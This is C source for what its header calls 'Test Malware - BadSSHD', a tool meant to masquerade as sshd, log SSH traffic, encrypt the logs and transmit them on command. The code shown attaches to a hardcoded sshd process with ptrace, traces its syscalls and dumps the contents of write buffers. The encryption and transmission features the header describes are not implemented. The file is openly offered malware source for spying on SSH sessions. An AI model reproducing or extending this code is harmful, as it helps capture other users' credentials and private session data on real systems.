/*
* Test Malware - BadSSHD
* 	Masquerades as SSHD, while logging all SSH comms
* - Hook SSHD, encrypt and log communication data
* - Transmit log files upon specific command
*/

/*
.PHONY: clean

BIN = badSSH

CC= gcc
CCFLAGS = -Wall -Wextra -O2
STATIC = -static -s


$(BIN): src/main.c
	$(CC) -o $@ $< -lsodium -lpthread

clean:
	rm -f $(BIN) src/main.o
*/

#include <unistd.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sodium.h>

#define SSHD_PID 3101


static void print_status(int status);
static void print_registers(struct user_regs_struct *regs);

static volatile int keepRunning = 1;


int main(int argc, char **argv)
{
	if (sodium_init() < 0)
	{
		puts("[!] Sodium failed to initialize");
		return -1;
	}

	if (ptrace(PTRACE_ATTACH, SSHD_PID, NULL, NULL) < 0)
	{
		puts("[!] Failed to attach to process.");
		return -1;
	}

	printf("[*] Attached to process %d\n\n", SSHD_PID);

	int wstatus;
	struct user_regs_struct registers;
	long syscall;

	ptrace(PTRACE_SETOPTIONS, SSHD_PID, 0, PTRACE_O_EXITKILL);
	
	while (1)
	{
		/* Get syscall/arguments */
		ptrace(PTRACE_SYSCALL, SSHD_PID, NULL, NULL);
		wait(&wstatus);
		ptrace(PTRACE_GETREGS, SSHD_PID, NULL, &registers);
		syscall = registers.orig_rax;
		printf("Syscall: %ld\n", syscall);

		/* Get return data */
		ptrace(PTRACE_SYSCALL, SSHD_PID, NULL, NULL);
		wait(&wstatus);
		ptrace(PTRACE_GETREGS, SSHD_PID, NULL, &registers);
		
		if ((syscall == SYS_select) && ((long)registers.rax < 0)) // Exit if select fails
		{
			break;
		}
		else if (syscall == SYS_write)
		{
			printf("WRITE: 0x%llX\n", registers.rsi);
			printf("%lX\n\n", ptrace(PTRACE_PEEKTEXT, SSHD_PID, registers.rsi, NULL));

		}
		else
		{
			printf("Return: %llX\n\n", registers.rax);
		}

	}



	if (ptrace(PTRACE_DETACH, SSHD_PID, NULL, NULL) != -1)
	{
		printf("\n[*] Detached from process %d\n", SSHD_PID);
	}	

	puts("\n[*] BadSSH exited gracefully");
	return 0;
}


static void print_status(int status)
{
	if WIFEXITED(status)
	{
		printf("Process %d exited w/ status: %d\n", SSHD_PID, WEXITSTATUS(status));
	}
	else if WIFSIGNALED(status)
	{
		printf("Process %d terminated by signal: %d\n", SSHD_PID, WTERMSIG(status));
	}
	else if WIFSTOPPED(status)
	{
		printf("Process %d stopped by signal: %d\n", SSHD_PID, WSTOPSIG(status));
	}
	else if WIFCONTINUED(status)
	{
		printf("Process %d continued\n", SSHD_PID);
	}
	else
	{
		printf("Status: %d\n", status);
	}
}

static void print_registers(struct user_regs_struct *regs)
{
	printf("RAX: 0x%llX\nRDI: 0x%llX\nRSI: 0x%llX\nRDX: 0x%llX\nR10: 0x%llX\nR8: 0x%llX\nR9: 0x%llX\n\n", regs->orig_rax, regs->rdi, regs->rsi, regs->rdx, regs->r10, regs->r8, regs->r9);
}
